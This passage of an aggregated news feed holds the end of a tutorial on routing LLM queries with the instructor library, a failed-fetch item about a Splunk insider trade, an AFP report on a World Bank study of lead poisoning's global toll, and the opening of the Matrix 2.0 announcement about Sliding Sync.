</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>    <span>email</span><span>:</span> <span>str</span>
</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>    <span>source</span><span>:</span> <span>ClientSource</span>
</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>    <span>start_date</span><span>:</span> <span>datetime</span><span>.</span><span>date</span>
</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>    <span>end_date</span><span>:</span> <span>datetime</span><span>.</span><span>date</span>
</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>
</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>    <span>async</span> <span>def</span> <span>execute</span><span>(</span><span>self</span><span>)</span> <span>-&gt;</span> <span>str</span><span>:</span>
</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>        <span>if</span> <span>self</span><span>.</span><span>source</span> <span>==</span> <span>ClientSource</span><span>.</span><span>GMAIL</span><span>:</span>
</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>            <span>...</span>
</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>        <span>elif</span> <span>self</span><span>.</span><span>source</span> <span>==</span> <span>ClientSource</span><span>.</span><span>CALENDAR</span><span>:</span>
</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>            <span>...</span>
</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>
</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a><span>class</span> <span>Retrival</span><span>(</span><span>BaseModel</span><span>):</span>
</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>    <span>queries</span><span>:</span> <span>List</span><span>[</span><span>SearchClient</span><span>]</span>
</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a>
</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a>    <span>async</span> <span>def</span> <span>execute</span><span>(</span><span>self</span><span>)</span> <span>-&gt;</span> <span>str</span><span>:</span>
</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a>        <span>return</span> <span>await</span> <span>asyncio</span><span>.</span><span>gather</span><span>(</span><span>*</span><span>[</span><span>query</span><span>.</span><span>execute</span><span>()</span> <span>for</span> <span>query</span> <span>in</span> <span>self</span><span>.</span><span>queries</span><span>])</span>
</span></code></pre></div>
<p>Now we can call this with a simple query like "What do I have today?" and it will try to async dispatch to the correct backend. Its will important to prompt the language model well, but we'll leave that for another day.</p>
<div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span>import</span> <span>instructor</span> 
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span>import</span> <span>openai</span>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span># Enables response_model in the openai client</span>
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span>instructor</span><span>.</span><span>patch</span><span>()</span>
</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>
</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span>retrival</span> <span>=</span> <span>openai</span><span>.</span><span>ChatCompletion</span><span>.</span><span>create</span><span>(</span>
</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>    <span>model</span><span>=</span><span>"gpt-4"</span><span>,</span>
</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>    <span>response_model</span><span>=</span><span>Retrival</span><span>,</span>
</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>    <span>messages</span><span>=</span><span>[</span>
</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>        <span>{</span><span>"role"</span><span>:</span> <span>"system"</span><span>,</span> <span>"content"</span><span>:</span> <span>"You are Jason's personal assistant."</span><span>},</span>
</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>        <span>{</span><span>"role"</span><span>:</span> <span>"user"</span><span>,</span> <span>"content"</span><span>:</span> <span>"What do I have today?"</span><span>}</span>
</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>    <span>],</span>
</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span>)</span>
</span></code></pre></div>
<p><strong>Example Output</strong></p>
<div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span>{</span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span>    </span><span>"queries"</span><span>:</span><span> </span><span>[</span>
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span>        </span><span>{</span>
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span>            </span><span>"query"</span><span>:</span><span> </span><span>No</span><span>ne</span><span>,</span>
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span>            </span><span>"keywords"</span><span>:</span><span> </span><span>No</span><span>ne</span><span>,</span>
</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span>            </span><span>"email"</span><span>:</span><span> </span><span>"jason@example.com"</span><span>,</span>
</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span>            </span><span>"source"</span><span>:</span><span> </span><span>"gmail"</span><span>,</span>
</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span>            </span><span>"start_date"</span><span>:</span><span> </span><span>"2023-09-17"</span><span>,</span>
</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span>            </span><span>"end_date"</span><span>:</span><span> </span><span>No</span><span>ne</span>
</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span>        </span><span>},</span>
</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span>        </span><span>{</span>
</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span>            </span><span>"query"</span><span>:</span><span> </span><span>No</span><span>ne</span><span>,</span>
</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span>            </span><span>"keywords"</span><span>:</span><span> </span><span>[</span><span>"meeting"</span><span>,</span><span> </span><span>"call"</span><span>,</span><span> </span><span>"zoom"</span><span>]]],</span>
</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a><span>            </span><span>"email"</span><span>:</span><span> </span><span>"jason@example.com"</span><span>,</span>
</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a><span>            </span><span>"source"</span><span>:</span><span> </span><span>"calendar"</span><span>,</span>
</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a><span>            </span><span>"start_date"</span><span>:</span><span> </span><span>"2023-09-17"</span><span>,</span>
</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a><span>            </span><span>"end_date"</span><span>:</span><span> </span><span>No</span><span>ne</span>
</span><span id="__span-6-18"><a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a>
</span><span id="__span-6-19"><a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a><span>        </span><span>}</span>
</span><span id="__span-6-20"><a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a><span>    </span><span>]</span>
</span><span id="__span-6-21"><a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a><span>}</span>
</span></code></pre></div>
<p>Notice that we have a list of queries, that route to different search backends, email and calendar. We can even dispatch them async to be as performance as possible. Not only do we dispatch to different backends (that we have no control over), but you are likely going to render them to the user differently as well, perhaps you want to summarize the emails in text, but you want to render the calendar events as a list that they can scroll across on a mobile app.</p>
<div>
<p>Can I used framework X?</p>
<p>I get this question many times, but its just code, within these dispatchs you can do whatever you want. You can use <code>input()</code> to ask the user for more information, make a post request, call a Langchain agent or LLamaindex query engine to get more information, the sky is the limit.</p>
</div>
<p>Both of these examples show case how both search providors and consumers can use <code>instructor</code> to model their systems. This is a powerful pattern that allows you to build a system that can be used by anyone, and can be used to build a LLM layer, from scratch, in front of any arbitrary backend.</p>
<h2 id="conclusion">Conclusion</h2>
<p>This isnt about fancy embedding tricks, its just plain old information retrival and query understanding. The beauty of instructor is that it simplifies modeling the complex and lets you define the output of the language model, the prompts, and the payload we send to the backend in a single place.</p>
<h2 id="whats-next">What's Next?</h2>
<p>Here I want to show that `instructor`` isn’t just about data extraction. It’s a powerful framework for building a data model and integrating it with your LLM. Structured output is just the beginning — the untapped goldmine is skilled use of tools and APIs.</p>
<p>I believe collaboration between domain experts and AI engineers the key to enable advanced tool use. I’ve been building a new tool on top of instructor that enables seamless collaboration and experimentation on LLMs with structured outputs. If you’re interested, visit <a href="https://useinstructor.com/">useinstructor.com</a> and take our survey to join the waitlist.
Together, let’s create tools that are as brilliant as the minds that use them.</p>


  


  



      
    </article>
  </div>
        
      </main>
      
        
      
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Insider trade on Splunk acquisition for 45,650% return (388 pts)]]></title>
            <link>https://twitter.com/unusual_whales/status/1704870849831125446</link>
            <guid>37599587</guid>
            <pubDate>Thu, 21 Sep 2023 15:58:25 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://twitter.com/unusual_whales/status/1704870849831125446">https://twitter.com/unusual_whales/status/1704870849831125446</a>, See on <a href="https://news.ycombinator.com/item?id=37599587">Hacker News</a></p>
Couldn't get https://twitter.com/unusual_whales/status/1704870849831125446: Error [ERR_FR_TOO_MANY_REDIRECTS]: Maximum number of redirects exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[Lead poisoning causes more death, IQ loss than thought: study (357 pts)]]></title>
            <link>https://medicalxpress.com/news/2023-09-poisoning-death-iq-loss-thought.html</link>
            <guid>37599542</guid>
            <pubDate>Thu, 21 Sep 2023 15:55:20 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://medicalxpress.com/news/2023-09-poisoning-death-iq-loss-thought.html">https://medicalxpress.com/news/2023-09-poisoning-death-iq-loss-thought.html</a>, See on <a href="https://news.ycombinator.com/item?id=37599542">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
									    
<div data-thumb="https://scx1.b-cdn.net/csz/news/tmb/2023/lead-poisoning-causes.jpg" data-src="https://scx2.b-cdn.net/gfx/news/2023/lead-poisoning-causes.jpg" data-sub-html="Blood lead level IQ loss function from Crump and colleagues. The blood lead level is mean lifetime blood lead level in children younger than 5 years. The solid line is the central estimate and the shaded area is the 95% CI as per the study by Crump and colleagues. IQ=intelligence quotient. Credit: <i>The Lancet Planetary Health</i> (2023). DOI: 10.1016/S2542-5196(23)00166-3">
        <figure>
            <img src="https://scx1.b-cdn.net/csz/news/800a/2023/lead-poisoning-causes.jpg" alt="Lead poisoning causes far more death, IQ loss than thought: study" title="Blood lead level IQ loss function from Crump and colleagues. The blood lead level is mean lifetime blood lead level in children younger than 5 years. The solid line is the central estimate and the shaded area is the 95% CI as per the study by Crump and colleagues. IQ=intelligence quotient. Credit: The Lancet Planetary Health (2023). DOI: 10.1016/S2542-5196(23)00166-3" width="800" height="355">
             <figcaption>
                Blood lead level IQ loss function from Crump and colleagues. The blood lead level is mean lifetime blood lead level in children younger than 5 years. The solid line is the central estimate and the shaded area is the 95% CI as per the study by Crump and colleagues. IQ=intelligence quotient. Credit: <i>The Lancet Planetary Health</i> (2023). DOI: 10.1016/S2542-5196(23)00166-3
            </figcaption>        </figure>
    </div>
<p>Lead poisoning has a far greater impact on global health than previously thought, potentially contributing to over five million deaths a year and posing a similar threat to air pollution, modeling research suggested Tuesday.
                                                </p>                                                                                
<p>The study, described as "a wake-up call", also estimated that exposure to the toxic metal causes <a href="https://medicalxpress.com/tags/young+children/" rel="tag">young children</a> in developing countries to lose an average of nearly six IQ points each.
</p><p>Lead pollution has been shown to cause a range of serious health problems, particularly relating to <a href="https://medicalxpress.com/tags/heart+disease/" rel="tag">heart disease</a> and the brain development of small children, resulting in <a href="https://medicalxpress.com/tags/leaded+gasoline/" rel="tag">leaded gasoline</a> being banned worldwide.
</p><p>But people can still be exposed to the <a href="https://medicalxpress.com/tags/potent+neurotoxin/" rel="tag">potent neurotoxin</a> via food, soil, cookware, fertilizers, cosmetics, lead-acid car batteries and other sources.
</p><p>The two World Bank economists who authored the study, published in the <i>Lancet Planetary Health</i> journal, said it was the first to assess the impact of lead exposure on heart disease deaths and child IQ loss in wealthy and developing nations.
</p><p>Lead author Bjorn Larsen told AFP that when the pair first saw the figure their model calculated, "we didn't even dare to whisper the number" because it was so "enormous".
</p><p>Their model estimates that 5.5 million adults died from heart disease in 2019 because of lead exposure, 90 percent of them in low- and <a href="https://medicalxpress.com/tags/middle-income+countries/" rel="tag">middle-income countries</a>.
</p><p>That is six times higher than the previous estimate, and represents around 30 percent of all deaths from <a href="https://medicalxpress.com/tags/cardiovascular+disease/" rel="tag">cardiovascular disease</a>—the leading cause of death worldwide.
</p><p>It would mean that lead exposure is a bigger cause of heart disease than smoking or cholesterol, Larsen said.
</p><h2>$6 trillion cost</h2>
<p>The research also estimated that children under five lost a cumulative 765 million IQ points due to lead poisoning globally in 2019, with 95 percent of those losses coming in developing countries.
</p><p>That number is nearly 80 percent higher than previously estimated.
</p><p>The World Bank researchers put the economic cost of lead exposure at $6 trillion in 2019, equivalent to seven percent of global gross domestic product.
</p><p>For the analysis, the researchers used estimates of blood lead levels in 183 countries taken from the landmark 2019 Global Burden of Disease study.
</p><p>Previous research had measured only lead's effect on heart disease when it came to raising <a href="https://medicalxpress.com/tags/blood+pressure/" rel="tag">blood pressure</a>. But the new study looked at numerous other ways lead affects hearts, such as the hardening of arteries that can lead to stroke, resulting in the higher numbers, Larsen said.
</p><p>Roy Harrison, an expert in <a href="https://medicalxpress.com/tags/air+pollution/" rel="tag">air pollution</a> and health at Birmingham University in the UK, who was not involved in the study, told AFP it was "interesting, but subject to many uncertainties".
</p><p>For example, the relationship between lead in blood and <a href="https://medicalxpress.com/tags/heart/" rel="tag">heart</a> disease is based on a survey in the United States, and whether those findings could be applied worldwide "is a huge jump of faith", he said.
</p><p>Harrison also pointed out that the model used estimations—not tests—of lead in blood in many developing countries.
</p><p>If the results were confirmed, "they would be of major public health significance, but at present, this is simply an interesting hypothesis", he said.
</p><h2>'Piece of the puzzle'</h2>
<p>Richard Fuller, president of the NGO Pure Earth, said that when surveys in developing countries did test for lead in blood, they mostly found higher levels than estimated in the new study.
</p><p>This means "the impact of lead might be worse than the report describes", he told AFP, calling it a "wake-up call".
</p><p>Larsen said "we're still a little in the dark" when it came to understanding how much different sources of lead contribute to blood contamination.
</p><p>Fuller said part of this "missing piece of the puzzle" was revealed in a Pure Earth report released on Tuesday, which analyzed 5,000 samples of consumer goods and food in 25 developing countries.
</p><p>It found high rates of lead contamination in metal pots and pans, ceramic cookware, paint, cosmetics and toys.
</p><p>"This is why poorer countries have so much <a href="https://medicalxpress.com/tags/lead+poisoning/" rel="tag">lead poisoning</a>," Fuller said. "It's items in the kitchen that are poisoning them."
                                                                                
                                        											</p><div>
												                                                    <p><strong>More information:</strong>
                                                    Bjorn Larsen et al, Global health burden and cost of lead exposure in children and adults: a health impact and economic modelling analysis, <i>The Lancet Planetary Health</i> (2023).  <a data-doi="1" href="https://dx.doi.org/10.1016/S2542-5196(23)00166-3" target="_blank">DOI: 10.1016/S2542-5196(23)00166-3</a>
																								
																								</p>
																							</div>
                                        											
										                                                                                    <p>
                                                © 2023 AFP
                                            </p>
                                                                                
                                        <!-- print only -->
                                        <div>
                                            <p><strong>Citation</strong>:
                                                 Lead poisoning causes far more death, IQ loss than thought: study (2023, September 12)
                                                 retrieved 21 September 2023
                                                 from https://medicalxpress.com/news/2023-09-poisoning-death-iq-loss-thought.html
                                            </p>
                                            <p>
                                            This document is subject to copyright. Apart from any fair dealing for the purpose of private study or research, no
                                            part may be reproduced without the written permission. The content is provided for information purposes only.
                                            </p>
                                        </div>
                                        
									</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Matrix 2.0: The Future of Matrix (435 pts)]]></title>
            <link>https://matrix.org/blog/2023/09/matrix-2-0/</link>
            <guid>37599510</guid>
            <pubDate>Thu, 21 Sep 2023 15:53:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://matrix.org/blog/2023/09/matrix-2-0/">https://matrix.org/blog/2023/09/matrix-2-0/</a>, See on <a href="https://news.ycombinator.com/item?id=37599510">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <p><strong><em>TL;DR: If you want to play with a shiny new Matrix 2.0 client, head over to <a href="https://element.io/blog/element-x-ignition/">Element X</a>.</em></strong></p>
<p>Matrix has been going for over 9 years now, providing an open standard for secure, decentralised communication for the open Web - and it’s been quite the journey to get to where we are today.  Right now, according to Synapse’s opt-in usage reporting, in total there are 111,873,374 matrix IDs on the public network, spanning 17,289,201 rooms, spread over 64,256 servers.  This is just scratching the surface, given we estimate that 66% of servers in the public network don’t report stats, and there are many enormous private networks of servers too.  We’ve come a long way from creating Matrix HQ as the first ever room on today’s public network, back on Aug 13th 2014 :)</p>
<p>Meanwhile, the Matrix ecosystem has continued to grow unbelievably - with huge numbers of independent clients, bots and bridges maturing into ecosystems of their own, whole new companies forming around the protocol, and organisations ranging from open source projects to governments, NGOs and Fortune 100 companies adopting Matrix as a way to run their own secure, decentralised, standards-based self-sovereign communication.</p>
<p>The world needs Matrix more than ever.  Every day the importance of decentralisation is more painfully obvious, as we concretely see the terrifying risks of centralised Internet services - whether that’s through corporate takeover, state censorship, blanket surveillance, Internet shutdowns, surveillance capitalism, or the spectre of gigantic centralised data breaches.  It’s been amazing to see the world pivot in favour of decentralisation over the time we’ve been building Matrix, and our mission has never been more important.</p>
<p>On one hand it feels we’re creeping ever closer to that goal of providing the missing communication layer for the open Web.  The European Union’s Digital Markets Act (DMA) is a huge step in that direction - regulation that mandates that if the large centralised messaging providers are to operate in the EU, they <strong>must</strong> interoperate.  We’ve been busy working away to make this a reality, including participating in the IETF for the first time as part of the MIMI working group - demonstrating <a href="https://datatracker.ietf.org/meeting/117/materials/slides-117-mimi-linearized-matrix-for-mimi-01">concretely</a> how (for instance) Android Messages could natively speak Matrix in order to interoperate with other services, while preserving end-to-end encryption.</p>
<p>On the other hand, Matrix has often got stuck in focusing on solving the Hard Problems of decentralisation, decentralised end-to-end encryption, and the logistical complexities of supporting a massive heterogeneous public communication network and its surrounding heterogeneous ecosystem.  It’s fair to say that in the early days our focus was on making something that worked at all - and then later, we shifted to focusing on something that worked and scaled correctly… but we hadn’t managed to focus on ensuring that Matrix provides the building blocks necessary to create blazingly fast, hyper-efficient communication apps which has potential to outperform the centralised mainstream messaging services…</p>
<p><strong>…until now!</strong></p>
<h2 id="matrix-2-0">Matrix 2.0</h2>
<p>Back at FOSDEM <a href="https://archive.fosdem.org/2023/schedule/event/matrix20/">we announced the idea of Matrix 2.0</a> - a series of huge step changes in terms of Matrix’s usability and performance, made up of <a href="https://github.com/matrix-org/matrix-spec-proposals/pull/3575">Sliding Sync</a> (instant login/launch/sync), <a href="https://github.com/matrix-org/matrix-spec-proposals/pull/3861">Native OIDC</a> (industry-standard authentication), <a href="https://github.com/matrix-org/matrix-spec-proposals/pull/3401">Native Group VoIP</a> (end-to-end encrypted large-scale voice &amp; video conferencing) and <a href="https://github.com/matrix-org/matrix-spec-proposals/pull/3902">Faster Joins</a> (lazy-loading room state when your server joins a room).</p>
<p>Now, we’re excited to announce that as of today everyone can start playing with these Matrix 2.0 features. There’s still some work to bring them formally into the specification, but we’re putting it out there for folks to experience right now. Developers: watch this space for updates on the spec front.</p>
<p>Practically speaking, this means there are now implementations of the four pillars of Matrix 2.0 available today which you can use to power a daily-driver Matrix 2.0 client.  The work here has been driven primarily by <a href="https://element.io/">Element</a>, using their new <a href="https://element.io/labs/element-x">Element X</a> client as the test-bed for the new Matrix 2.0 functionality and to prove that the new APIs are informed by real-world usage and can concretely demonstrably create an app which begins to outperform iMessage, WhatsApp and Telegram in terms of usability and performance… all while benefiting from being 100% built on Matrix.</p>
<h3 id="matrix-rust-sdk-and-element-x">matrix-rust-sdk and Element X</h3>
<p><a href="https://element.io/blog/element-x-ignition/"><img src="https://matrix.org/blog/img/20230921-element-x.png"></a></p>
<p>The mission of Matrix 2.0 has been to provide a huge step forwards in real-world performance, usability and stability - and that means using a real client codebase as a guinea pig to ensure the new protocol is fit for purpose. <a href="https://github.com/matrix-org/matrix-rust-sdk">matrix-rust-sdk</a> has been the main vehicle for this, with <a href="https://element.io/labs/element-x">Element X</a> as the app primarily driving the new features (although other clients built on matrix-rust-sdk such as <a href="https://gitlab.gnome.org/GNOME/fractal#beta-version">Fractal 5</a> can then automatically benefit from the work should they wish).</p>
<p>To see what all the fuss is about, your best bet is probably to head over to the <a href="https://element.io/blog/element-x-ignition/">Element X launch blog post</a> and read all about it!  But from the Matrix perspective, this is a flag day in terms of the existence of a Matrix client which empirically outperforms the mainstream clients both in terms of usability and performance: it shows that Matrix is indeed viable to power communication for billions of users, should we get the chance.</p>
<p>From a client perspective: this has meant implementing Sliding Sync (<a href="https://github.com/matrix-org/matrix-spec-proposals/blob/kegan/sync-v3/proposals/3575-sync.md">MSC3575</a>) in matrix-rust-sdk - and then creating the entirely new <a href="https://matrix-org.github.io/matrix-rust-sdk/matrix_sdk_ui/index.html">matrix-sdk-ui</a> crate in order to expose higher level APIs to help apps efficiently drive their UI, without each app having to keep reinventing the wheel and risking getting it wrong.  The new UI crate gives APIs for efficiently managing a lazy-loaded room list, lazy-loaded room timelines (including edits, reactions, aggregations, redactions etc), and even when the app should show a sync spinner or not.  As a result, the vast majority of the heavy lifting can be handled in matrix-rust-sdk, ensuring that the app layer can focus on UI rather than Matrix guts - and performance improvements (e.g. roomlist caching and timeline caching) can all be handled in one place to the benefit of all clients using the SDK.</p>
<p>This is a huge breakthrough relative to the old days of Matrix where each client would have no choice but burn significant amounts of time hand-carving its own timeline and encryption glue logic (although of course clients are still very welcome to do so if they wish!) - but for those wanting higher-level building building blocks, matrix-rust-sdk now provides an excellent basis for experimenting with Matrix 2.0 clients.  It’s worth noting that the library is still evolving <strong>fast</strong>, though, and many APIs are not long-term stable.  Both the Sliding Sync API and the UI crates are still subject to significant change, and while the crypto crate and its underlying <a href="https://github.com/matrix-org/vodozemac">vodozemac</a> E2EE implementation is pretty stable, features such as E2EE Backup are still being added to the top-level matrix-rust-sdk (and thence Element X).</p>
<p>In order to hook matrix-rust-sdk up to Element X, the Element team <a href="https://github.com/mozilla/uniffi-rs/pull/1346">ended</a> <a href="https://github.com/mozilla/uniffi-rs/pull/1292">up</a> <a href="https://github.com/mozilla/uniffi-rs/pull/1259">contributing</a> <a href="https://github.com/mozilla/uniffi-rs/pull/1684">cancellable</a> <a href="https://github.com/mozilla/uniffi-rs/pull/1409">async bindings</a> to <a href="https://mozilla.github.io/uniffi-rs/">uniffi</a>, Mozilla’s language binding generator, so you can now call matrix-rust-sdk directly from Swift, Kotlin and (in theory) other languages, complete with beautifully simple async/await non-blocking semantics.  This looks to be a pretty awesome stack for doing modern cross-platform development - so even if you have a project which isn’t natively in Rust, you should be able to lean on matrix-rust-sdk if you so desire!  We hope that other projects will follow the Rust + Swift/Kotlin pattern for their extreme performance needs :)</p>
<h3 id="sliding-sync">Sliding Sync</h3>
<p>The single biggest change in Matrix 2.0 is the proposal of an entirely new sync API called Sliding Sync (<a href="https://github.com/matrix-org/matrix-spec-proposals/blob/kegan/sync-v3/proposals/3575-sync.md">MSC3575</a>).  The goal of Sliding Sync is to ensure that the application has the option of loading the absolutely bare essential data required to render its visible user interface - ensuring that operations which have historically been horribly slow in Matrix (login and initial sync, launch and incremental sync) are instant, no matter how many rooms the user is in or how large those rooms are.</p>
<p>While matrix-rust-sdk implements both Sync v2 (the current API in Matrix 1.8) as well as Sliding Sync, Element X deliberately only implements Sliding Sync, in order to focus exclusively on getting the fastest UI possible (and generally to exercise the API).  Therefore to use Element X, you need to be running a homeserver with Sliding Sync support, which (for now) means running a <a href="https://github.com/matrix-org/sliding-sync">sliding-sync proxy</a> which bolts Sliding Sync support on to existing homeservers.  You can check out Thib’s <a href="https://www.youtube.com/watch?v=25wkV2ZCSsM">excellent tutorial</a> for how to get up and running (or <a href="https://element.io/server-registration">Element Server Suite</a> provides packages from the Element team)</p>
<p>Now, implementing Sliding Sync in matrix-rust-sdk has been a bit of a journey.  Since we <a href="https://archive.fosdem.org/2023/schedule/event/matrix_clients_as_good_as_youd_expect/">showed off</a> the very first implementation at FOSDEM, two big problems came to light.  For a bit of context: the original design of Sliding Sync was heavily inspired by Discord’s architecture - where the server calculates an ordered list of large numbers of items (your room list, in Matrix’s case); the client says which window into the list it’s currently displaying; and the server sends updates to the client as the view changes.  The user then scrolls around that list, sliding the window up and down, and the server sends the appropriate updates - hence the name Sliding Sync.</p>
<p>Sliding Sync was originally driven by our work on <a href="https://github.com/matrix-org/lb">Low Bandwidth Matrix</a> - as it makes no sense to have a fancy line protocol which can run over a 2400 baud modem… if the first thing the app tries to do is download a 100MB Sync v2 initial-sync response, or for that matter a 10MB incremental-sync response after having been offline for a few days (10MB takes 9 hours to shift over a 2400 baud modem, for those who missed out on the 80s).  Instead, you clearly only want to send the absolute essentials to the client, no matter how big their account is, and that’s what Sliding Sync does.</p>
<p>The first minor flaw in the plan, however, is that the server doesn’t necessarily have all the data it needs to order the room list.  Room ordering depends on what the most recent visible events are in a room, and if the room’s end-to-end encrypted, the server has no way of knowing which events are going to be visible for a given client or not.  It also doesn’t know which rooms have encrypted mentions inside them, and we <a href="https://github.com/matrix-org/matrix-spec-proposals/pull/3952#discussion_r1112203279">don’t want to leak mention metadata</a> to the server, or design out keyword mentions.  So, MSC3575 proposed some complicated contortions to let the client tweak the order client-side based on its superior knowledge of the ordering (given most clients would need to sync all the encrypted rooms anyway, in order to index them and search for keyword notifications etc).  Meanwhile, the order might be ‘good enough’ even without those tweaks.</p>
<p>The second minor flaw in the plan was that having implemented Sliding Sync in Element X, it turns out that the user experience on mobile of incrementally loading in room list entries from the server as the user scrolls around the list is simply not good enough, especially on bad connectivity - and the last thing we want to do is to design out support for bad connectivity in Matrix.  Users have been trained on mobile to expect to be able to swipe rapidly through infinite-scrolling lists of tens of thousands of photos in their photo gallery, or tens of thousands of emails in their mail client, without ever seeing a single placeholder, even for a frame.  So if the network roundtrip time to your server is even 100ms, and Sliding Sync is operating infinitely quickly, you’re still going to end up showing a placeholders for a few frames (6 frames, at 60fps, to be precise) if the user starts scrolling rapidly through their room list.  And empirically that doesn’t look great - the 2007-vintage <a href="https://www.amazon.co.uk/Creative-Selection-Ken-Kocienda/dp/1250194466">iOS team</a> have a lot to answer for in terms of setting user expectations!</p>
<p>So, the obvious way to solve both of these problems is simply to pull in more data in the background, to anticipate the user scrolling around.  In fact, it turns out we need to do that anyway, and indeed pull in <em>all</em> the room data so that room-search is instantly responsive; waiting 100ms or more to talk to the server whenever the user tries to search their roomlist is no fun at all, and it transpires that many users navigate their roomlist entirely by search rather than scrolling.  As a result, the sliding sync implementation in matrix-rust-sdk has ended up maintaining an ‘all rooms’ list, which starts off syncing the roomlist details for the most recent N rooms, and then in the background expands to sync all the rest.  At which point we’re not really sliding a window around any more: instead it’s more of a QoSed incremental sync.</p>
<p>So, to cut a long story short: while the current Sliding Sync implementation in matrix-rust-sdk and Element X empirically works very well, it’s ended up being a bit too complicated and we expect some pretty significant simplifications in the near future based on the best practices figured out with clients using it.  Watch this space for updates, although it’s likely that the current form of MSC3575 will prevail in some respect in order to support low-bandwidth environments where roomlist ordering and roomsearch latency is less important than preserving bandwidth.  Critically, we want to figure this out before we encourage folks to implement native server implementations - so for now, we’ll be keeping using the sliding-sync proxy as a way to rapidly experiment with the API as it evolves.</p>
<h3 id="native-matrix-group-voip">Native Matrix Group VoIP</h3>
